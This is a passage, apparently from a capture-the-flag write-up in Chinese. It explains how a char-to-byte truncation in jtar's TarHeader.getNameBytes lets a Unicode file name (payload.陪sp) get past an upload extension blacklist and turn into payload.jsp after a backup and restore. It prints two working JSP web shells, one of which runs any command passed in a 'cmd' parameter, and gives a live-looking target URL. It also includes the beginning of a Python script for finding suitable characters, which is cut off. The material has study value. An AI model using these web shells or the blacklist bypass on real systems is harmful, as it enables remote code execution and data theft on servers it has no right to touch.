<span class="token keyword">throw</span> var17<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tarInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        tarInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var16<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        var3<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var16<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    tarInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//</span><span class="token comment">// Source code recreated from a .class file by IntelliJ IDEA</span><span class="token comment">// (powered by FernFlower decompiler)</span><span class="token comment">//</span><span class="token keyword">package</span> <span class="token namespace">d3<span class="token punctuation">.</span>example<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">LinkOption</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">UUID</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span></span><span class="token class-name">MultipartFile</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Upload</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">secureUpload</span><span class="token punctuation">(</span><span class="token class-name">MultipartFile</span> file<span class="token punctuation">,</span> <span class="token class-name">String</span> uploadDir<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> blackList<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UploadException</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UploadException</span><span class="token punctuation">(</span><span class="token string">"File cannot be empty"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token class-name">String</span> originalFilename <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkFileNameSecurity</span><span class="token punctuation">(</span>originalFilename<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkFileTypeSecurity</span><span class="token punctuation">(</span>originalFilename<span class="token punctuation">,</span> file<span class="token punctuation">.</span><span class="token function">getContentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> blackList<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> safeFileName <span class="token operator">=</span> <span class="token function">generateSafeFileName</span><span class="token punctuation">(</span>originalFilename<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Path</span> uploadPath <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>uploadDir<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>uploadPath<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LinkOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">createDirectories</span><span class="token punctuation">(</span>uploadPath<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token class-name">Path</span> targetPath <span class="token operator">=</span> uploadPath<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>safeFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>                file<span class="token punctuation">.</span><span class="token function">transferTo</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> safeFileName<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UploadException</span><span class="token punctuation">(</span><span class="token string">"ERROR: "</span> <span class="token operator">+</span> var7<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkFileNameSecurity</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UploadException</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileName <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>fileName<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">".*[\\\\/$;:%\u0000].*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UploadException</span><span class="token punctuation">(</span><span class="token string">"File name contains forbidden character"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UploadException</span><span class="token punctuation">(</span><span class="token string">"Invalid file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkFileTypeSecurity</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">,</span> <span class="token class-name">String</span> contentType<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> blackList<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UploadException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> fileExt <span class="token operator">=</span> <span class="token function">getFileExtension</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>blackList <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>blackList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> blackList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>fileExt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UploadException</span><span class="token punctuation">(</span><span class="token string">"Forbidden type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isContentTypeValid</span><span class="token punctuation">(</span>fileExt<span class="token punctuation">,</span> contentType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UploadException</span><span class="token punctuation">(</span><span class="token string">"File content does not match the type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">generateSafeFileName</span><span class="token punctuation">(</span><span class="token class-name">String</span> originalName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> ext <span class="token operator">=</span> <span class="token function">getFileExtension</span><span class="token punctuation">(</span>originalName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">UUID</span><span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> ext<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getFileExtension</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">getFilenameExtension</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isContentTypeValid</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileExt<span class="token punctuation">,</span> <span class="token class-name">String</span> contentType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>contentType <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> expectedType <span class="token operator">=</span> <span class="token function">getMimeTypeByExtension</span><span class="token punctuation">(</span>fileExt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> contentType<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>expectedType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getMimeTypeByExtension</span><span class="token punctuation">(</span><span class="token class-name">String</span> ext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>ext<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">"jpg"</span><span class="token operator">:</span>            <span class="token keyword">case</span> <span class="token string">"jpeg"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"png"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"image/png"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"gif"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"image/gif"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"pdf"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"application/pdf"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"doc"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"application/msword"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"docx"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"application/vnd.openxmlformats-officedocument.wordprocessingml.document"</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"txt"</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"text/plain"</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token string">"application/octet-stream"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体原理可查看jtar源码（<a href="https://github.com/kamranzafar/jtar%EF%BC%89%E4%B8%ADTarHeader%E7%9A%84">https://github.com/kamranzafar/jtar）中TarHeader的</a> getNameBytes方法如下，使用(byte)强制转换unicode文件名称时会导致字符截断， 打包后文件名称发生改变。 </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getNameBytes</span><span class="token punctuation">(</span><span class="token class-name">StringBuffer</span> name<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> name<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>buf<span class="token punctuation">[</span>offset <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> name<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>buf<span class="token punctuation">[</span>offset <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> offset <span class="token operator">+</span> length<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>buf[offset + i] = (byte)name.charAt(i);</code> 这一行将 char 强制转换为 byte, 由于 Java 中 char 是 16 位的 Unicode 字符 (0-65535), 而 byte 是有符号的 8 位整数（-128-127）, 强制转换时会截断高 8 位，仅保留低 8 位，所以这里我们只需要找到超出 byte 范围的 Unicode 值，它被转换成 byte 后就会变成指定的 ASCII 值 (如 char 的值为 257 时强制转换为 byte 就是为 1, 即 ascii 码为 1)</p><p>利用这一点，我们可以将后缀带有特定unicode字符的文件上传 至靶机，绕过后缀黑名单检查，通过备份与恢复功能将上传的文件转变为jsp后缀的文 件并放回jsp可解析目录，最终RCE获取flag。</p><p>文件名：payload.陪sp –&gt; payload.jsp </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.*"</span> <span class="token operator">%</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"printenv"</span><span class="token punctuation">;</span> <span class="token class-name">String</span> output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token keyword">try</span> <span class="token punctuation">{</span>           <span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">String</span> line<span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             output <span class="token operator">+=</span> line <span class="token operator">+</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>         output <span class="token operator">=</span> <span class="token string">"Error executing command: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>  <span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">&gt;</span></span> <span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">&gt;</span></span><span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">&gt;</span></span><span class="token class-name">Command</span> <span class="token class-name">Output</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span> <span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">&gt;</span></span> <span class="token generics"><span class="token punctuation">&lt;</span>h2<span class="token punctuation">&gt;</span></span><span class="token class-name">Executed</span> <span class="token class-name">Command</span><span class="token operator">:</span> <span class="token generics"><span class="token punctuation">&lt;</span>code<span class="token punctuation">&gt;</span></span><span class="token operator">&lt;</span><span class="token operator">%=</span> cmd <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>code<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span> <span class="token generics"><span class="token punctuation">&lt;</span>pre<span class="token punctuation">&gt;</span></span><span class="token operator">&lt;</span><span class="token operator">%=</span> output <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pre<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>[Command Output](http://35.241.98.126:31184/view?page=23709ae1-04e3-4a35-9fc9-6202eb616cbc)</code></p><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.*, java.io.*"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Process</span> p <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> line<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>h1<span class="token punctuation">&gt;</span></span><span class="token class-name">Webshell</span> <span class="token class-name">Active</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"GET"</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"cmd"</span> size<span class="token operator">=</span><span class="token string">"80"</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Execute"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>http://35.241.98.126:31184/view?page=23709ae1-04e3-4a35-9fc9-6202eb616cbc&amp;cmd=env</code></p><p>解题所使用的unicode字符可以参考以下脚本获取，只要可以转换为正常后缀的 ASCII字符即可，例如payload.멪ⅳば也是相同效果。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unicodedata  <span class="token keyword">def</span> <span class="token function">reverse_search</span><span class="token punctuation">(</span>byte_value<span class="token punctuation">)</span><span class="token punctuation">:</span>     low_byte <span class="token operator">=</span> byte_value <span class="token operator">&amp;</span> <span class="token number">0xFF</span>     candidates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> high <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xFF</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> code_point <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low_byte <span class="token keyword">try</span><span class="token punctuation">:</span> char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>code_point<span class="token punctuation">)</span> name <span class="token operator">=</span> unicodedata<span class="token punctuation">.</span>name<span class="token punctuation">(</span>char<span class="token punctuation">)</span> candidates<span class="token punctuation">.</span>append<span class="token 